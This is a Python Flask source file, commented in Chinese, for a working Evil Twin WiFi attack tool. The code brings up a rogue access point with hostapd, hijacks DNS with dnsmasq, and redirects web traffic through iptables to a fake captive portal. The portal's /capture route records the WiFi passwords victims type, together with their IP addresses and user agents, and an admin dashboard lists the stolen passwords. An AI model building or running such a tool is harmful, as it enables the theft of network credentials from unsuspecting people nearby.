# app.py
from flask import Flask, render_template, request, jsonify, redirect
import sqlite3
import subprocess
import os
import json
import re
import sys
from datetime import datetime

app = Flask(__name__)
DB_PATH = 'evil_twin.db'
LOG_PATH = 'evil_twin.log'

def run_cmd(args, timeout=8):
    """Run a command and always capture stdout/stderr for diagnostics."""
    try:
        return subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired as e:
        r = subprocess.CompletedProcess(args, 124, e.stdout or '', e.stderr or '')
        r.stderr = (r.stderr + '\nCommand timed out').strip()
        return r
    except Exception as e:
        return subprocess.CompletedProcess(args, 1, '', str(e))

def ensure_runtime_permissions():
    """Fail early when sudo-created files are not writable by the current user."""
    project_dir = os.path.abspath(os.path.dirname(__file__) or '.')
    for path in (DB_PATH, LOG_PATH):
        abs_path = os.path.abspath(path)
        if os.path.exists(abs_path) and not os.access(abs_path, os.W_OK):
            msg = (
                f"Permission denied: {abs_path}\n"
                f"请执行 sudo chown -R $USER:$USER {project_dir}"
            )
            print(msg, file=sys.stderr)
            raise SystemExit(msg)
        if not os.path.exists(abs_path) and not os.access(os.path.dirname(abs_path) or '.', os.W_OK):
            msg = (
                f"Permission denied: cannot create {abs_path}\n"
                f"请执行 sudo chown -R $USER:$USER {project_dir}"
            )
            print(msg, file=sys.stderr)
            raise SystemExit(msg)

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn

def get_default_route_ifaces():
    r = run_cmd(['ip', 'route', 'show', 'default'], timeout=5)
    ifaces = set()
    for line in r.stdout.splitlines():
        parts = line.split()
        if 'dev' in parts:
            idx = parts.index('dev')
            if idx + 1 < len(parts):
                ifaces.add(parts[idx + 1])
    return ifaces

def get_ipv4_addresses(iface):
    r = run_cmd(['ip', '-o', '-4', 'addr', 'show', 'dev', iface], timeout=5)
    addrs = []
    for line in r.stdout.splitlines():
        parts = line.split()
        if 'inet' in parts:
            idx = parts.index('inet')
            if idx + 1 < len(parts):
                addrs.append(parts[idx + 1])
    return addrs

def get_link_state(iface):
    r = run_cmd(['ip', '-o', 'link', 'show', 'dev', iface], timeout=5)
    m = re.search(r'\bstate\s+(\S+)', r.stdout)
    return m.group(1) if m else 'UNKNOWN'

def get_connected_ssid(iface):
    r = run_cmd(['iw', 'dev', iface, 'link'], timeout=5)
    ssid = ''
    connected = False
    if r.returncode == 0:
        for line in r.stdout.splitlines():
            s = line.strip()
            if s.startswith('Connected to '):
                connected = True
            elif s.startswith('SSID:'):
                ssid = s.split(':', 1)[1].strip()
    return connected, ssid

def is_usb_interface(iface):
    try:
        device_path = os.path.realpath(os.path.join('/sys/class/net', iface, 'device'))
        return '/usb' in device_path.lower() or iface.startswith('wlx')
    except Exception:
        return iface.startswith('wlx')

def get_usb_wifi_diagnostics():
    r = run_cmd(['lsusb'], timeout=5)
    devices = []
    patterns = ('netgear', 'mediatek', 'mt7925', 'wireless')
    for line in r.stdout.splitlines():
        lower = line.lower()
        if any(p in lower for p in patterns) or '0846:9072' in lower:
            devices.append(line.strip())
    return {
        'lsusb_available': r.returncode == 0,
        'lsusb_error': r.stderr.strip(),
        'usb_wifi_detected': bool(devices),
        'usb_devices': devices,
    }

def discover_wireless_interfaces():
    names = []
    iw_result = run_cmd(['iw', 'dev'], timeout=5)
    if iw_result.returncode == 0:
        for line in iw_result.stdout.splitlines():
            if line.strip().startswith('Interface '):
                name = line.strip().split()[-1]
                if name and name not in names:
                    names.append(name)

    if not names:
        try:
            for entry in os.listdir('/sys/class/net/'):
                wireless_dir = os.path.join('/sys/class/net/', entry, 'wireless')
                if os.path.isdir(wireless_dir) and entry not in names:
                    names.append(entry)
        except Exception:
            pass

    default_ifaces = get_default_route_ifaces()
    interfaces = []
    for name in names:
        connected, ssid = get_connected_ssid(name)
        ips = get_ipv4_addresses(name)
        interfaces.append({
            'name': name,
            'state': get_link_state(name),
            'connected': connected,
            'ssid': ssid,
            'ips': ips,
            'has_ip': bool(ips),
            'default_route': name in default_ifaces,
            'is_usb_likely': is_usb_interface(name),
            'recommended': False,
        })

    recommended = choose_recommended_interface(interfaces)
    for iface in interfaces:
        iface['recommended'] = iface['name'] == recommended

    diag = get_usb_wifi_diagnostics()
    usb_interface_present = any(i['is_usb_likely'] for i in interfaces)
    diag.update({
        'iw_available': iw_result.returncode == 0,
        'iw_error': iw_result.stderr.strip(),
        'iw_created_wireless_interface': bool(interfaces),
        'driver_warning': (
            'USB WiFi 已识别但驱动未创建接口，可能需要重新插拔 USB 网卡或冷重启。'
            if diag['usb_wifi_detected'] and not usb_interface_present else ''
        )
    })
    return interfaces, recommended, diag

def choose_recommended_interface(interfaces):
    if not interfaces:
        return ''
    candidates = [i for i in interfaces if not i['default_route'] and not i['connected']]
    usb_candidates = [i for i in candidates if i['is_usb_likely']]
    if usb_candidates:
        return usb_candidates[0]['name']
    if candidates:
        return candidates[0]['name']
    non_default = [i for i in interfaces if not i['default_route']]
    if non_default:
        return non_default[0]['name']
    return interfaces[0]['name']

def ensure_valid_network_interface():
    conn = get_db()
    config = conn.execute('SELECT network_interface FROM config WHERE id = 1').fetchone()
    saved = config['network_interface'] if config else ''
    interfaces, recommended, diag = discover_wireless_interfaces()
    names = [i['name'] for i in interfaces]
    selected = saved if saved in names else recommended
    changed = bool(selected and selected != saved)
    if changed:
        conn.execute('UPDATE config SET network_interface = ? WHERE id = 1', (selected,))
        conn.commit()
        app.logger.info('network_interface auto-selected: saved=%s selected=%s', saved, selected)
    conn.close()
    return selected, saved, changed, interfaces, recommended, diag

# ==================== 页面路由 ====================

@app.route('/')
def index():
    """管理后台首页"""
    ensure_valid_network_interface()
    conn = get_db()
    config = conn.execute('SELECT * FROM config WHERE id = 1').fetchone()
    password_count = conn.execute('SELECT COUNT(*) as count FROM password_logs').fetchone()['count']
    mac_count = conn.execute('SELECT COUNT(*) as count FROM mac_logs').fetchone()['count']
    conn.close()
    
    return render_template('index.html', 
                         config=config, 
                         password_count=password_count,
                         mac_count=mac_count)

@app.route('/passwords')
def passwords_page():
    """密码记录页面"""
    conn = get_db()
    passwords = conn.execute('SELECT * FROM password_logs ORDER BY captured_at DESC').fetchall()
    conn.close()
    return render_template('passwords.html', passwords=passwords)

@app.route('/macs')
def macs_page():
    """MAC地址记录页面"""
    conn = get_db()
    macs = conn.execute('SELECT * FROM mac_logs ORDER BY captured_at DESC').fetchall()
    conn.close()
    return render_template('macs.html', macs=macs)

# ==================== API接口 ====================

@app.route('/api/config', methods=['GET', 'POST'])
def manage_config():
    """获取/更新SSID配置"""
    conn = get_db()
    
    if request.method == 'GET':
        conn.close()
        ensure_valid_network_interface()
        conn = get_db()
        config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase FROM config WHERE id = 1').fetchone()
        conn.close()
        return jsonify(dict(config))
    
    elif request.method == 'POST':
        data = request.json
        if data is None:
            conn.close()
            return jsonify({'status': 'error', 'message': '无效的JSON数据'}), 400
        old_config = conn.execute('SELECT network_interface FROM config WHERE id = 1').fetchone()
        old_iface = old_config['network_interface'] if old_config else ''
        evil_ssid = data.get('evil_ssid', 'Free_WiFi')
        evil_channel = data.get('evil_channel', 6)
        network_interface = data.get('network_interface', '')
        evil_passphrase = data.get('evil_passphrase', '12345678')
        
        conn.execute('UPDATE config SET evil_ssid = ?, evil_channel = ?, network_interface = ?, evil_passphrase = ? WHERE id = 1', 
                    (evil_ssid, evil_channel, network_interface, evil_passphrase))
        conn.commit()
        conn.close()
        
        # 如果热点正在运行，重启hostapd以应用新配置
        if is_process_running('hostapd'):
            restart_hotspot(old_iface)
        
        return jsonify({'status': 'success', 'message': '配置已更新'})

@app.route('/api/passwords', methods=['GET'])
def get_passwords():
    """获取所有密码记录"""
    conn = get_db()
    passwords = conn.execute('SELECT * FROM password_logs ORDER BY captured_at DESC').fetchall()
    conn.close()
    return jsonify([dict(row) for row in passwords])

@app.route('/api/passwords', methods=['DELETE'])
def clear_passwords():
    """清空所有密码记录"""
    conn = get_db()
    conn.execute('DELETE FROM password_logs')
    conn.commit()
    conn.close()
    return jsonify({'status': 'success', 'message': '已清空所有密码记录'})

@app.route('/api/macs', methods=['GET'])
def get_macs():
    """获取所有MAC记录"""
    conn = get_db()
    macs = conn.execute('SELECT * FROM mac_logs ORDER BY captured_at DESC').fetchall()
    conn.close()
    return jsonify([dict(row) for row in macs])

@app.route('/api/macs', methods=['DELETE'])
def clear_macs():
    """清空所有MAC记录"""
    conn = get_db()
    conn.execute('DELETE FROM mac_logs')
    conn.commit()
    conn.close()
    return jsonify({'status': 'success', 'message': '已清空所有MAC记录'})

@app.route('/api/status', methods=['GET'])
def get_status():
    """获取系统运行状态"""
    # 检查hostapd是否运行
    hostapd_running = run_cmd(['pgrep', 'hostapd']).returncode == 0
    dnsmasq_running = run_cmd(['pgrep', 'dnsmasq']).returncode == 0
    
    return jsonify({
        'hostapd': hostapd_running,
        'dnsmasq': dnsmasq_running,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/start', methods=['POST'])
def start_attack():
    """启动攻击"""
    result = start_evil_twin()
    return jsonify(result)

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    """停止攻击"""
    result = stop_evil_twin()
    return jsonify(result)

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    """自动扫描无线网卡口"""
    selected, saved, changed, interfaces, recommended, diagnostics = ensure_valid_network_interface()
    return jsonify({
        'interfaces': interfaces,
        'names': [i['name'] for i in interfaces],
        'current': selected,
        'saved': saved,
        'changed': changed,
        'recommended': recommended,
        'diagnostics': diagnostics,
    })

@app.route('/api/scan', methods=['POST'])
def scan_wifi():
    """扫描周围 WiFi 网络 — 优先 iw，失败时 fallback 到 iwlist"""
    iface, saved, changed, interfaces, recommended, diagnostics = ensure_valid_network_interface()
    if not iface:
        return jsonify({
            'status': 'error',
            'message': '未检测到可用无线网卡',
            'stderr': diagnostics.get('iw_error') or diagnostics.get('lsusb_error') or '',
            'diagnostics': diagnostics,
        }), 200
    
    aps = []
    errors = []

    iface_info = next((i for i in interfaces if i['name'] == iface), None)
    if iface_info and iface_info['default_route']:
        errors.append(f'{iface} 是默认路由网卡，正在用于服务器联网/SSH；仅在用户明确选择它时才会操作。')
    
    # 方法1: Linux iw scan
    up_result = run_cmd(['sudo', 'ip', 'link', 'set', iface, 'up'], timeout=8)
    if up_result.returncode != 0:
        app.logger.warning('ip link set %s up failed: %s', iface, up_result.stderr.strip())
        return jsonify({
            'status': 'error',
            'message': f'网卡 {iface} 启用失败',
            'stderr': up_result.stderr.strip(),
            'stdout': up_result.stdout.strip(),
            'interface': iface,
        }), 200

    r = run_cmd(['sudo', 'iw', 'dev', iface, 'scan'], timeout=15)
    if r.returncode == 0:
        aps = parse_iw_scan(r.stdout)
    if r.returncode != 0 or not aps:
        errors.append(f"iw scan failed/empty: {r.stderr.strip() or 'empty result'}")
        app.logger.info('iw scan fallback for %s: returncode=%s stderr=%s aps=%s', iface, r.returncode, r.stderr.strip(), len(aps))
    
    # 方法2: Linux iwlist fallback
    if not aps:
        r2 = run_cmd(['sudo', 'iwlist', iface, 'scanning'], timeout=20)
        if r2.returncode == 0:
            aps = parse_iwlist_scan(r2.stdout)
        if r2.returncode != 0 or not aps:
            errors.append(f"iwlist scan failed/empty: {r2.stderr.strip() or 'empty result'}")
            app.logger.info('iwlist scan failed/empty for %s: returncode=%s stderr=%s aps=%s', iface, r2.returncode, r2.stderr.strip(), len(aps))
    
    if not aps:
        return jsonify({
            'status': 'error',
            'message': f'未发现任何 WiFi 网络，请检查网卡 {iface}',
            'stderr': '\n'.join(errors),
            'interface': iface,
        }), 200
    
    aps.sort(key=lambda x: x['signal'], reverse=True)
    return jsonify({'status': 'success', 'results': aps, 'count': len(aps), 'interface': iface, 'warnings': errors})


def parse_iw_scan(stdout):
    """解析 iw dev scan 输出"""
    aps = []
    current = None
    for line in stdout.splitlines():
        stripped = line.strip()
        if stripped.startswith('BSS ') and '(' in stripped:
            if current and current.get('ssid'):
                aps.append(current)
            current = {
                'bssid': stripped.split()[1].split('(')[0],
                'ssid': '', 'channel': 0, 'signal': -99, 'security': 'OPEN', 'frequency': 0
            }
        elif current is None:
            continue
        if stripped.startswith('SSID:'):
            ssid = stripped[5:].strip()
            current['ssid'] = ssid if ssid else '<隐藏>'
        elif stripped.startswith('freq:'):
            try:
                freq = int(float(stripped.split()[1]))
                current['frequency'] = freq
                current['channel'] = freq_to_channel(freq)
            except (IndexError, ValueError):
                app.logger.warning('Unable to parse iw frequency line: %s', stripped)
        elif stripped.startswith('signal:'):
            try:
                current['signal'] = float(stripped.split()[1])
            except:
                pass
        elif 'RSN:' in stripped or 'WPA:' in stripped:
            current['security'] = 'WPA'
    if current and current.get('ssid'):
        aps.append(current)
    return aps

def parse_iwlist_scan(stdout):
    """解析 iwlist <iface> scanning 输出，返回前端兼容字段。"""
    aps = []
    current = None

    def finish_current():
        if current and current.get('ssid'):
            if current['security'] == 'UNKNOWN':
                current['security'] = 'OPEN'
            aps.append(current.copy())

    for line in stdout.splitlines():
        stripped = line.strip()
        if 'Cell ' in stripped and 'Address:' in stripped:
            finish_current()
            bssid = stripped.split('Address:', 1)[1].strip().upper()
            current = {
                'bssid': bssid,
                'ssid': '',
                'channel': 0,
                'signal': -99,
                'security': 'UNKNOWN',
                'frequency': 0,
            }
            continue

        if current is None:
            continue

        if stripped.startswith('ESSID:'):
            ssid = stripped.split(':', 1)[1].strip().strip('"')
            current['ssid'] = ssid if ssid else '<隐藏>'
        elif stripped.startswith('Channel:'):
            try:
                current['channel'] = int(stripped.split(':', 1)[1].strip())
            except ValueError:
                pass
        elif stripped.startswith('Frequency:'):
            freq_match = re.search(r'Frequency:([0-9.]+)\s*GHz', stripped)
            chan_match = re.search(r'\(Channel\s+(\d+)\)', stripped)
            if freq_match:
                current['frequency'] = int(float(freq_match.group(1)) * 1000)
            if chan_match:
                current['channel'] = int(chan_match.group(1))
            elif current['frequency']:
                current['channel'] = freq_to_channel(current['frequency'])
        elif 'Signal level=' in stripped:
            signal_match = re.search(r'Signal level=(-?\d+)', stripped)
            if signal_match:
                current['signal'] = int(signal_match.group(1))
        elif stripped.startswith('Quality=') and current['signal'] == -99:
            quality_match = re.search(r'Quality=(\d+)/(\d+)', stripped)
            if quality_match:
                quality = int(quality_match.group(1)) / max(int(quality_match.group(2)), 1)
                current['signal'] = round(-100 + quality * 60, 1)
        elif stripped.startswith('Encryption key:'):
            current['security'] = 'WEP' if stripped.endswith('on') else 'OPEN'
        elif 'WPA2' in stripped or 'IEEE 802.11i' in stripped or 'RSN' in stripped:
            current['security'] = 'WPA2'
        elif 'WPA Version' in stripped or 'WPA' in stripped:
            if current['security'] != 'WPA2':
                current['security'] = 'WPA'

    finish_current()
    return aps


def parse_netsh_output(stdout):
    """解析 netsh wlan show networks mode=bssid（直接调 v2）"""
    return parse_netsh_v2(stdout)


def parse_netsh_v2(stdout):
    """解析 netsh wlan show networks mode=bssid (状态机)"""
    import re
    aps = []
    seen = set()
    ssid = ''
    auth = 'OPEN'
    bssid = ''
    for line in stdout.splitlines():
        s = line.strip()
        m_ssid = re.match(r'^SSID\s+\d+\s*:\s*(.+)', s)
        if m_ssid:
            ssid = m_ssid.group(1).strip()
        m_auth = re.match(r'^\s*Authentication\s*:\s*(.+)', s)
        if m_auth:
            a = m_auth.group(1).strip()
            auth = 'OPEN' if a.lower() == 'open' else 'WPA'
        m_bss = re.match(r'^\s*BSSID\s+\d+\s*:\s*(.+)', s)
        if m_bss:
            bssid = m_bss.group(1).strip().upper()
            signal = 0
            channel = 0
        m_sig = re.match(r'^\s*Signal\s*:\s*(\d+)%', s)
        if m_sig:
            pct = int(m_sig.group(1))
            signal = round(-100 + pct * 0.6, 1)
        m_ch = re.match(r'^\s*Channel\s*:\s*(\d+)', s)
        if m_ch:
            channel = int(m_ch.group(1))
            # 一个 BSS 完成
            if bssid and ssid and bssid not in seen:
                seen.add(bssid)
                aps.append({
                    'bssid': bssid, 'ssid': ssid or '<隐藏>',
                    'channel': channel, 'signal': signal,
                    'security': auth, 'frequency': 0
                })
    return aps


def freq_to_channel(freq):
    """频率 MHz 转信道号"""
    if 2412 <= freq <= 2484:
        return (freq - 2407) // 5
    elif 4915 <= freq <= 5825:
        return (freq - 5000) // 5
    elif freq >= 5835:
        return (freq - 5950) // 5  # 6 GHz
    return 0

@app.route('/api/clients')
def get_clients():
    """获取已连接客户端列表（dnsmasq leases）"""
    clients = []
    try:
        with open('/var/lib/misc/dnsmasq.leases') as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 4:
                    clients.append({
                        'mac': parts[1],
                        'ip': parts[2],
                        'hostname': parts[3] if len(parts) > 3 else ''
                    })
    except:
        pass
    return jsonify({'clients': clients, 'count': len(clients)})


@app.route('/api/diag')
def get_diag():
    """诊断：hostapd日志、进程状态、已连接设备"""
    hostapd_log = ''
    try:
        with open('/tmp/hostapd.log') as f:
            hostapd_log = f.read()[-1000:]
    except:
        hostapd_log = '(无日志)'
    
    return jsonify({
        'hostapd_running': is_process_running('hostapd'),
        'dnsmasq_running': is_process_running('dnsmasq'),
        'hostapd_log': hostapd_log
    })


# ==================== 钓鱼页面 ====================

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    """所有未匹配的路径都跳转到钓鱼页（DNS劫持后强制门户）"""
    # 排除已定义的路由
    if path.startswith('api/') or path.startswith('static/'):
        from flask import abort
        abort(404)
    if request.method == 'POST' and request.path == '/capture':
        return  # 由 capture() 处理
    # 苹果 Captive Portal 检测
    ua = request.headers.get('User-Agent', '')
    if 'CaptiveNetworkSupport' in ua:
        return 'Success', 200
    return render_template('portal.html')


@app.route('/portal')
def portal():
    """钓鱼页面"""
    return render_template('portal.html')

@app.route('/capture', methods=['POST'])
def capture():
    """接收密码和MAC地址"""
    password = request.form.get('password', '')
    mac = request.remote_addr
    
    # 尝试从请求头获取真实MAC地址
    if request.headers.get('X-Forwarded-For'):
        client_ip = request.headers.get('X-Forwarded-For')
    else:
        client_ip = request.remote_addr
    
    # 获取User-Agent
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    conn = get_db()
    
    # 保存密码
    conn.execute('INSERT INTO password_logs (password, bssid) VALUES (?, ?)', 
                (password, client_ip))
    
    # 保存MAC地址信息
    conn.execute('INSERT INTO mac_logs (mac_address, ip_address, user_agent) VALUES (?, ?, ?)',
                (mac, client_ip, user_agent))
    
    conn.commit()
    conn.close()
    
    try:
        log_capture
    except NameError:
        print(f"[!] Captured: Password='{password}' | IP={client_ip} | UA={user_agent}")
    else:
        log_capture(password, client_ip, user_agent)
    
    # 返回错误页面，引导用户连接真实WiFi
    return render_template('capture_error.html'), 401

# ==================== 核心攻击函数 ====================

def start_evil_twin():
    """启动Evil Twin攻击"""
    ensure_valid_network_interface()
    
    # 获取配置
    conn = get_db()
    config = conn.execute('SELECT evil_ssid, evil_channel, network_interface, evil_passphrase FROM config WHERE id = 1').fetchone()
    conn.close()
    
    evil_ssid = config['evil_ssid']
    evil_channel = config['evil_channel']
    iface = config['network_interface']
    passphrase = config['evil_passphrase'] if config['evil_passphrase'] else ''
    open_mode = not passphrase or passphrase.upper() == 'OPEN'
    
    if not iface:
        return {'status': 'error', 'message': '未检测到可用无线网卡'}
    
    # 2. 配置hostapd
    if open_mode:
        hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={evil_ssid}
hw_mode=g
channel={evil_channel}
"""
    else:
        hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={evil_ssid}
hw_mode=g
channel={evil_channel}
wpa=2
wpa_passphrase={passphrase}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    with open('/tmp/hostapd.conf', 'w') as f:
        f.write(hostapd_conf)
    
    # 3. 配置dnsmasq (DNS劫持)
    dnsmasq_conf = f"""
interface={iface}
bind-dynamic
listen-address=192.168.4.1
no-resolv
dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
server=8.8.8.8
address=/#/192.168.4.1
dhcp-authoritative
"""
    with open('/tmp/dnsmasq.conf', 'w') as f:
        f.write(dnsmasq_conf)
    
    # 4. 设置网卡IP
    run_cmd(['sudo', 'ip', 'addr', 'add', '192.168.4.1/24', 'dev', iface])
    up_result = run_cmd(['sudo', 'ip', 'link', 'set', iface, 'up'])
    if up_result.returncode != 0:
        return {
            'status': 'error',
            'message': f'网卡 {iface} 启用失败',
            'stderr': up_result.stderr.strip(),
        }
    
    # 端口转发：80 → 5000（强制门户）
    run_cmd(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '5000'])
    run_cmd(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '5000'])

    # 5. 启动服务
    run_cmd(['sudo', 'pkill', '-9', 'dnsmasq'])  # 清理残留
    with open('/tmp/hostapd.log', 'w') as hp_log:
        subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'],
                        stdout=hp_log, stderr=subprocess.STDOUT)
    with open('/tmp/dnsmasq.log', 'w') as dm_log:
        subprocess.Popen(['sudo', 'dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d', '--log-facility=/tmp/dnsmasq.log'],
                        stdout=dm_log, stderr=subprocess.STDOUT)
    
    import time
    time.sleep(1)
    if not is_process_running('hostapd'):
        err = ''
        try:
            with open('/tmp/hostapd.log') as f:
                err = f.read()[-500:]
        except:
            pass
        return {'status': 'error', 'message': 'hostapd 启动失败', 'stderr': err}
    
    return {'status': 'success', 'message': f'Evil Twin "{evil_ssid}" 已启动'}

def is_process_running(name):
    return run_cmd(['pgrep', name], timeout=5).returncode == 0

def stop_evil_twin(iface_override=None):
    """停止Evil Twin攻击"""
    conn = get_db()
    config = conn.execute('SELECT network_interface FROM config WHERE id = 1').fetchone()
    conn.close()
    iface = iface_override or (config['network_interface'] if config else '')
    
    run_cmd(['sudo', 'pkill', 'hostapd'])
    run_cmd(['sudo', 'pkill', 'dnsmasq'])
    if iface:
        run_cmd(['sudo', 'ip', 'addr', 'del', '192.168.4.1/24', 'dev', iface])
        run_cmd(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '5000'])
        run_cmd(['sudo', 'iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '5000'])
    return {'status': 'success', 'message': '攻击已停止'}

def restart_hotspot(old_iface=None):
    """重启热点以应用新配置"""
    stop_evil_twin(old_iface)
    start_evil_twin()

if __name__ == '__main__':
    import logging, atexit
    ensure_runtime_permissions()

    # 访问日志写到文件（不刷屏），每天轮转
    capture_log = logging.getLogger('capture')
    capture_log.setLevel(logging.INFO)
    fh = logging.FileHandler('evil_twin.log', encoding='utf-8')
    fh.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
    capture_log.addHandler(fh)

    def log_capture(password, ip, ua):
        capture_log.info(f"Captured: Password='{password}' IP={ip} UA={ua}")

    # 禁用 waitress 访问日志（防爆终端）
    import waitress
    waitress_log = logging.getLogger('waitress')
    waitress_log.setLevel(logging.ERROR)

    atexit.register(lambda: logging.shutdown())

    from waitress import serve
    serve(app, host='0.0.0.0', port=5000, _quiet=True)